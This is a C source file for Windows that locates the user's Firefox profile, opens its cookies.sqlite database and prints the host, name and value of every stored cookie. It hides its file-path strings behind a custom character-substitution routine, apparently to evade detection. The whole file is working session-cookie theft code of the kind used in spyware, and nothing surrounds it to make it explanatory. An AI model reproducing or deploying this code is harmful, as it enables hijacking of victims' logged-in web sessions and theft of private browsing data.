
#include <windows.h>
#define _CRT_SECURE_NO_WARNINGS 1
#include <stdio.h>

#include "sqlite3.h"

#define SAFE_FREE(x)  { if(x) free(x); x = NULL; }

#define ALPHABET_LEN 64
char *DeobStringA(char *string)
{
	char alphabet[ALPHABET_LEN]={'_','B','q','w','H','a','F','8','T','k','K','D','M',
		'f','O','z','Q','A','S','x','4','V','u','X','d','Z',
		'i','b','U','I','e','y','l','J','W','h','j','0','m',
		'5','o','2','E','r','L','t','6','v','G','R','N','9',
		's','Y','1','n','3','P','p','c','7','g','-','C'};                  
	static char ret_string[MAX_PATH];
	DWORD i,j, scramble=1;

	_snprintf_s(ret_string, MAX_PATH, "%s", string);

	for (i=0; ret_string[i]; i++) {
		for (j=0; j<ALPHABET_LEN; j++)
			if (ret_string[i] == alphabet[j]) {
				ret_string[i] = alphabet[(j+scramble)%ALPHABET_LEN];
				break;
			}
	}
	return ret_string;
}

WCHAR *DeobStringW(WCHAR *string)
{
	WCHAR alphabet[ALPHABET_LEN]={L'_',L'B',L'q',L'w',L'H',L'a',L'F',L'8',L'T',L'k',L'K',L'D',L'M',
		L'f',L'O',L'z',L'Q',L'A',L'S',L'x',L'4',L'V',L'u',L'X',L'd',L'Z',
		L'i',L'b',L'U',L'I',L'e',L'y',L'l',L'J',L'W',L'h',L'j',L'0',L'm',
		L'5',L'o',L'2',L'E',L'r',L'L',L't',L'6',L'v',L'G',L'R',L'N',L'9',
		L's',L'Y',L'1',L'n',L'3',L'P',L'p',L'c',L'7',L'g',L'-',L'C'};                  
	static WCHAR ret_string[MAX_PATH];
	DWORD i,j, scramble=1;

	_snwprintf_s(ret_string, MAX_PATH, L"%s", string);

	for (i=0; ret_string[i]; i++) {
		for (j=0; j<ALPHABET_LEN; j++)
			if (ret_string[i] == alphabet[j]) {
				ret_string[i] = alphabet[(j+scramble)%ALPHABET_LEN];
				break;
			}
	}
	return ret_string;
}

WCHAR *GetFFProfilePath()
{
	static WCHAR FullPath[MAX_PATH];
	WCHAR appPath[MAX_PATH];
	WCHAR iniFile[MAX_PATH];
	WCHAR profilePath[MAX_PATH];
	DWORD pathSize = MAX_PATH;

	memset(appPath, 0, sizeof(appPath));
	memset(profilePath, 0, sizeof(profilePath));

	GetEnvironmentVariableW(L"APPDATA", appPath, MAX_PATH);

	// Get firefox profile directory
	_snwprintf_s(iniFile, MAX_PATH, DeobStringW(L"%9\\D5OZyyH\\aZEIM5S\\PE5MZyI9.Z1Z"), appPath); //"%s\\Mozilla\\Firefox\\profiles.ini"

	GetPrivateProfileStringW(DeobStringW(L"3E5MZyIj"), L"Path", L"",  profilePath, sizeof(profilePath), iniFile); //"Profile0"

	_snwprintf_s(FullPath, MAX_PATH, DeobStringW(L"%9\\D5OZyyH\\aZEIM5S\\%9"), appPath, profilePath);  //"%s\\Mozilla\\Firefox\\%s"

	return FullPath;
}

void NormalizeDomainA(char *domain)
{
	char *src, *dst;
	if (!domain)
		return;
	src = dst = domain;
	for(; *src=='.'; src++);
	for (;;) {
		if (*src == '/' || *src==NULL)
			break;
		*dst = *src;
		dst++;
		src++;
	}
	*dst = NULL;
}

int static parse_sqlite_cookies(void *NotUsed, int argc, char **argv, char **azColName)
{
	char *host = NULL;
	char *name = NULL;
	char *value = NULL;

	for(int i=0; i<argc; i++){
		if(!host && !_stricmp(azColName[i], "host"))
			host = _strdup(argv[i]);
		if(!name && !_stricmp(azColName[i], "name"))
			name = _strdup(argv[i]);
		if(!value && !_stricmp(azColName[i], "value"))
			value = _strdup(argv[i]);
	}	

	NormalizeDomainA(host);
	if (host && name && value)
		printf("host=%s,\tname=%s,\tvalue=%s\n",host,name,value);

	SAFE_FREE(host);
	SAFE_FREE(name);
	SAFE_FREE(value);

	return 0;
}


char *GetDosAsciiName(WCHAR *orig_path)
{
	char *dest_a_path;
	WCHAR dest_w_path[_MAX_PATH + 2];
	DWORD mblen;

	memset(dest_w_path, 0, sizeof(dest_w_path));
	if (!GetShortPathNameW(orig_path, dest_w_path, (sizeof(dest_w_path) / sizeof (WCHAR))-1))
		return NULL;

	if ( (mblen = WideCharToMultiByte(CP_ACP, 0, dest_w_path, -1, NULL, 0, NULL, NULL)) == 0 )
		return NULL;

	if ( !(dest_a_path = (char *)malloc(mblen)) )
		return NULL;

	if ( WideCharToMultiByte(CP_ACP, 0, dest_w_path, -1, (LPSTR)dest_a_path, mblen, NULL, NULL) == 0 ) {
		free(dest_a_path);
		return NULL;
	}

	return dest_a_path;
}

int static DumpSqliteCookies(WCHAR *profilePath, WCHAR *signonFile)
{
	sqlite3 *db;
	char *ascii_path;
	CHAR sqlPath[MAX_PATH];
	int rc;

	if (!(ascii_path = GetDosAsciiName(profilePath)))
		return 0;

	sprintf_s(sqlPath, MAX_PATH, "%s\\%S", ascii_path, signonFile);

	SAFE_FREE(ascii_path);

	if ((rc = sqlite3_open(sqlPath, &db))) 
		return 0;

	sqlite3_exec(db, "SELECT * FROM moz_cookies;", parse_sqlite_cookies, NULL, NULL);

	sqlite3_close(db);

	return 1;
}


int DirectoryExists(WCHAR *path)
{
	DWORD attr = GetFileAttributesW(path);

	if (!path)
		return 0;

	if( (attr < 0) || !(attr & FILE_ATTRIBUTE_DIRECTORY ) ) 
		return 0;

	return 1;
}

int DumpFFCookies(void)
{
	WCHAR *ProfilePath = NULL; 	//Profile path

	ProfilePath = GetFFProfilePath();
	printf("%S\n",ProfilePath);
	if (ProfilePath == NULL || !DirectoryExists(ProfilePath)) 
		return 0;

	DumpSqliteCookies(ProfilePath, L"cookies.sqlite"); 

	return 0;
}


int main() 
{
	DumpFFCookies();
	system("pause");
	return 1;
}